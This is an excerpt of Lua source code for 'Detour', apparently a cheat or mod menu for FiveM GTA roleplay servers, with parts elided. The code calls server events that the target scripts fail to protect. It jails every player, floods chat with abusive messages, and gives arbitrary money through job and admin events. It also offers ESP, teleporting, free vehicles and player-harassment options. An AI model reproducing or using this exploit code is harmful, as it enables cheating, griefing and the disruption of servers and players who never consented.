print 'hello u here to disconnect eh? -'
Detour = {} 
...
function Detour.CreateMenu(id, title)
	...
	menus[id].subTitle = "oFlaqme#1149"
	...
	function()
		while Enabled do
			...
			if banallusers then
				...
				TriggerServerEvent("esx_jailler:sendToJail", GetPlayerServerId(i), 59999, "Detour :)", 997)
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 9937, "Detour :)", 300)
				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "Detour :)")
				TriggerServerEvent("esx-qalle-jail:jailPlayerNew", GetPlayerServerId(i), 5000, "Detour :)")
				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 50000)
				TriggerServerEvent("8321hiue89js", GetPlayerServerId(i), 5007, "Detour :)", 32532532, securityToken)
				TriggerServerEvent("esx_jailer:sendToJailCatfrajerze", GetPlayerServerId(i), 300000, "Detour :)", 500324532)
				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 5000, "Detour :)")
				TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 5000, "dude weed")
				TriggerServerEvent('chatMessageEntered', "SYSTEM", { 0, 0, 0 }, GetPlayerName(PlayerId()) .."Fuck you all")
					end
				end
                    ...
                    function()
                        ...
                        for bD = 5, 5 do
                            TriggerServerEvent(
                                ...
                                '^' .. bD .. '^1D^2e^3t^4o^5u^6r Menu: The server just got fucked by ^1D^2e^3t^4o^5u^6r'
                            )
                        end
                        for i = 0, 128 do
                            TriggerServerEvent(
                            ...
                            TriggerServerEvent(
                                ...
                                GetPlayerServerId(i),
                                'Purposeless',
                                '^1D^2e^3t^4o^5u^6r Menu: The server just got fucked by ^1D^2e^3t^4o^5u^6r',
                                43161337
                            )
                    ...
                    function()
                        ...
                        for bD = 5, 5 do
                            TriggerServerEvent(
								...
								'^' .. bD .. '^1D^2e^3t^4o^5u^6r ^1Menu: ^9The server just got fucked by ^1D^2e^3t^4o^5u^6r https://discord.gg/d76GGdp'
                            )
                        end
                        for i = 0, 128 do
                            local dl =
...
Citizen.CreateThread(
	function()
		...
		Detour.CreateMenu("MainMenu", "~w~Detour ∑")
		Detour.SetSubTitle("MainMenu", "~w~Detour Version 1.0") 
		Detour.CreateSubMenu("SelfMenu", "MainMenu", "Self Menu")
		Detour.CreateSubMenu("Xposed", "MainMenu", "Xposed")
		Detour.CreateSubMenu("Destroyer", "MainMenu", "Destroyer")
		Detour.CreateSubMenu("VehMenu", "MainMenu", "Vehicle Menu")
		Detour.CreateSubMenu("ServerMenu", "MainMenu", "LUA Execution")
		...
		Detour.CreateSubMenu("ESXMisc", "ServerMenu", "ESX Misc Options")
		Detour.CreateSubMenu("ESXDrugs", "ServerMenu", "ESX Drugs")
		Detour.CreateSubMenu("MiscServerOptions", "ServerMenu", "Misc Server Options")
		Detour.CreateSubMenu("RecrutarPlayers", "ServerMenu", "Recrutar Players")
		Detour.CreateSubMenu("RecrutarPlayersOptions", "RecrutarPlayers", "Recrutar Players options")
		Detour.CreateSubMenu('BoostMenu', 'VehMenu', 'Vehicle Boost ~b~>~s~')
		Detour.CreateSubMenu('PowerBoostMenu', 'BoostMenu', 'Power Boost ~b~>~s~')
		Detour.CreateSubMenu('TorqueBoostMenu', 'BoostMenu', 'Torque Boost ~b~>~s~')
		...
		while Enabled do
			if Detour.IsMenuOpened("MainMenu") then
			    drawNotification("~w~Detour by ~r~oFlaqme & Flacko") --You are actually pathetic if you edit this menu. -Cat & Flacko
				drawNotification("~g~Official Discord: ~r~https://discord.gg/jmrRe4C")
				drawNotification("~r~Version ~b~1.~g~0")
				   if Detour.MenuButton("~w~Player ~w~Menu  ", "SelfMenu") then
				elseif Detour.MenuButton("~w~Online ~w~Players  ", "OnlinePlayerMenu") then
				elseif Detour.MenuButton("~w~ESP ~w~Menu  ", "Xposed") then
				...
				elseif Detour.MenuButton("~r~Server ~r~Options ~w~∑  ", "Destroyer") then
				elseif Detour.MenuButton("~w~Triggerevent menu ~w~  ", "ServerMenu") then
				elseif Detour.MenuButton("~w~VRP trigger ~w~  ", "VRPMoney") then
				elseif Detour.Button("~r~Close Menu") then
					Enabled = false
				elseif Detour.Button("~w~By ~r~oFlaqme ~w~& ~g~Flacko" ) then
					Enabled = false
				end
			...
			elseif Detour.IsMenuOpened("SelfMenu") then
				...
				elseif Detour.Button("~b~Armour") then
					...
					elseif Detour.Button("~w~Detour swipe ~g~(500k+)") then
				...
				then
				elseif
					 Detour.CheckBox("~w~Speed Demon",SpeedDemon,
		...
		Detour.Display()
			elseif Detour.IsMenuOpened("TeleportMenu") then
				...
				TeleportToWaypoint()
			 elseif Detour.Button("~w~Teleport ~g~Vehicle ~r~NW") then
					drawNotification("~y~No working wait next update fix")
			 end

		Detour.Display()
			elseif Detour.IsMenuOpened("Xposed") then
			if
				Detour.CheckBox(
				"~w~ESP",
				esp,
		...
		Detour.Display()
		elseif Detour.IsMenuOpened("Destroyer") then
...
Detour.Display()
		...
		elseif Detour.IsMenuOpened('TorqueBoostMenu') then 
			...
			elseif Detour.IsMenuOpened("VehMenu") then
				...
				elseif Detour.Button("~g~Buy vehicle free") then fv()
				elseif
					Detour.CheckBox(
...
--triggerevent menu
			...
			elseif Detour.IsMenuOpened("ServerMenu") then
				if Detour.MenuButton("~w~Menu ~r~RECRUIT PLAYERS ~p~NW", "RecrutarPlayers") then
				elseif Detour.MenuButton("~w~Menu ~b~BOSS", "ESXBoss") then
				elseif Detour.MenuButton("~w~Menu ~g~MONEY", "ESXMoney") then
				elseif Detour.MenuButton("~w~Menu ~p~DRUGS", "ESXDrugs") then
				elseif Detour.MenuButton("~w~Menu ~o~OTHERS", "ESXMisc") then
				end
			...
			elseif Detour.Button("~g~Money ~w~1") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent("esx_jobs:caution", "give_back", result)
			end
			elseif Detour.Button("~g~Money ~w~2") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('esx_truckerjob:pay', result)
			end
			elseif Detour.Button("~g~Money ~w~3") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('AdminMenu:giveBank', result)
			end
			elseif Detour.Button("~g~Money ~w~4") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('AdminMenu:giveCash', result)
				end
			elseif Detour.Button("~g~Money ~w~5") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_gopostaljob:pay", result)
				end
			elseif Detour.Button("~g~Money ~w~6") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_banksecurity:pay", result)
				end
			elseif Detour.Button("~g~Money ~w~7") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_slotmachine:sv:2", result)
				end
			elseif Detour.Button("~g~Money ~w~8") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result then
					TriggerServerEvent("lscustoms:payGarage", {costs = -result})
				end		
			elseif Detour.Button("~g~Money ~w~9") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result then
				TriggerServerEvent("vrp_slotmachine:server:2", result)
				end
			elseif Detour.Button("~g~Money ~w~10") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent('AdminMenu:giveDirtyMoney', result)
				end
			elseif Detour.Button("~g~Money ~w~11") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent('esx_truckerjob:pay', result)
				end
			elseif Detour.Button("~g~Money ~w~12") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent('delivery:success', result)
				end
			elseif Detour.Button("~g~Money ~w~13") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent ('taxi:success', result)
				end
			elseif Detour.Button("~g~Money ~w~14") then
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
			elseif Detour.Button("~g~Money ~w~15") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
			...
			Detour.Display()
				elseif Detour.IsMenuOpened("ESXMisc") then
				...
				elseif Detour.Button("~w~Send Discord Message") then
			...
			elseif Detour.IsMenuOpened("VRPOptions") then
				...
				Detour.Display()
			elseif Detour.IsMenuOpened("ESXDrugs") then
				...
				elseif Detour.Button("~g~Money Wash ~c~(x10)") then
					...
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
				elseif Detour.Button("~r~Stop all ~c~(Drugs)") then
...
-- online player n shit		
    ...
    elseif Detour.Button("~w~Teleport To Player") then
				...
				elseif Detour.Button("~g~Give ~w~Money") then
				...
				elseif Detour.Button("~r~Tunnel ~w~Player") then -- Tunnel Player
